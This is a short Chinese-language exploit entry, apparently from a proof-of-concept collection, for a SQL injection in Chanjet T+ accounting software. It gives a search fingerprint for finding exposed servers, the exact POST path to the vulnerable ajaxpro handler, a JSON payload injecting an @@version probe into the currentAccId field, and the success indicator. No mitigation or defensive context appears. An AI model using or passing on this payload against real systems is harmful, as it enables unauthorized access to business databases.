# 畅捷通T+Load-Ufida.T.SM.UIP.ashx存在SQL注入漏洞

用友 ｜ SQL注入 ｜ —
- **指纹**：`app="畅捷通-TPlus"`
- **请求**：`POST /tplus/ajaxpro/Ufida.T.SM.UIP.MultiCompanySettingController,Ufida.T.SM.UIP.ashx?method=Load HTTP/1.1`

**Payload**
```
{"currentAccId":"2' and 1=@@version--+", "currentAcc":"1", "currentDsName":"1", "currentVersion":"1", "currentVersionNo":"1"}
```
- **响应特征**：200